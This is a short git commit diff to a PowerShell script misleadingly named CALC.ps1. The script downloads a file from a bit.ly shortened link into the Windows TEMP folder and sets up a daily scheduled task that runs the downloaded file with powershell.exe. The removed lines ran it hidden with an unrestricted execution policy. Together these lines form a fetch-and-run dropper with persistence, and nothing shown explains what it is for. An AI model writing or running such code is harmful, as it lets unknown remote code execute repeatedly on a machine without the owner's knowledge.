bda0c8d8b32bc38fe82101370ba57cd5b070eb87
nyambos <48624786+nyambos@users.noreply.github.com>
2019-03-22 14:11:40 +0200

    Update CALC.ps1

--- CALC.ps1
+++ CALC.ps1
@@ -1,10 +1,6 @@
 (New-Object Net.WebClient).DownloadFile('https://bit.ly/2TPR0lG','C:\WINDOWS\TEMP\local.txt')
 
-
-
-$TaskScript = "C:\WINDOWS\TEMP\local.txt"
-
-$action = New-ScheduledTaskAction -Execute 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe' -Argument '-WindowStyle Hidden -NonInteractive -Executionpolicy unrestricted -file $TaskScript'
+$action = New-ScheduledTaskAction -Execute 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe' -Argument 'C:\WINDOWS\TEMP\local.txt'
 
 $trigger = New-ScheduledTaskTrigger -Daily -At 9am
 
